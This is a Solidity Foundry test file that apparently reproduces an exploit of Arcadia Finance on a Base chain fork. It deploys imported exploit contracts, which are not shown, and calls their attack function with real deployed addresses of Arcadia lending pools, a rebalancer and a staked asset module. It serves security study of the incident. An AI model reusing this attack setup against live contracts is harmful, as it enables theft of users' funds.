// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {Exploit1} from "./Exploit1.sol";
import {ExploitHook} from "./ExploitHook.sol";

contract Exploit_ArcadiaFinance is TestHarness, TokenBalanceTracker {
    function setUp() external {
        cheat.createSelectFork("base", 32881440);

        // addTokenToTracker(address(weth));
        // addTokenToTracker(address(usdc));
        // addTokenToTracker(address(wbtc));

        updateBalanceTracker(address(this));
    }

    function test_attack() external {
        console.log("===== Initial Balances =====");
        logBalancesWithLabel("Attacker", tx.origin);
        logBalancesWithLabel("Attacker Contract", address(this));

        // Deploy the exploit hook contract
        ExploitHook exploitHook = new ExploitHook();

        // Deploy the exploit contract 1
        Exploit1 exploit1 = new Exploit1();

        exploit1.createAccounts(15, 0xDa14Fdd72345c4d2511357214c5B89A919768e59);

        exploit1.attack(
            Exploit1.Data(
                0x9529E5988ceD568898566782e88012cf11C3Ec99, // targetContract
                0xC729213B9b72694F202FeB9cf40FE8ba5F5A4509, // rebalancerSpot
                0xC729213B9b72694F202FeB9cf40FE8ba5F5A4509, // rebalancerSpot2
                0x827922686190790b37229fd06084350E74485b72, // NFTPositionManagerAERO_CL_POS
                0x3ec4a293Fb906DD2Cd440c20dECB250DeF141dF1, // arcadiaLendingPoolUSDC
                0xa37E9b4369dc20940009030BfbC2088F09645e3B, // arcadiaLendingPoolcbBTC
                0x803ea69c7e87D1d6C86adeB40CB636cC0E6B98E2, // arcadiaLendingPoolWETH
                address(exploitHook), // attackerContract
                0x1Dc7A0f5336F52724B650E39174cfcbbEdD67bF1, // arcadiaStakedSlipstreamAM
                0x4200000000000000000000000000000000000006, // weth
                150000000000000000000 // number
            )
        );
    }
}
